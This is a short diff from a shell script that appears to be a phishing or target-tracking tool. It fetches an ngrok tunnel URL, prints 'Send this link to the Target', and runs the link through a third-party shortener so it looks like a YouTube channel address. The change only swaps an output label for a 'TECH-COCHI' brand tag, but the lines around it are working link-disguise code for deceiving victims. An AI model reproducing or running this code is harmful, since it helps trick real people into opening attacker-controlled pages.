@@ -392,7 +392,7 @@ link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Target:\e[0m\e[1;77m %s\e[0m\n" $link
 send_ip=$(curl -s "http://www.techcochi.unaux.com/api-create.php?url=https://www.youtube.com/channel/UCdUnJ0qjDZ-psQYtgyoEl9Q=$link" | head -n1)
 #send_ip=$(curl -s http://www.techcochi.unaux.com api-create.php?url=$send_link | head -n1)
-printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
+printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] BY TECH-COCHI:\e[0m\e[1;77m %s \n' $send_ip
 printf "\n"
 
 checkfound
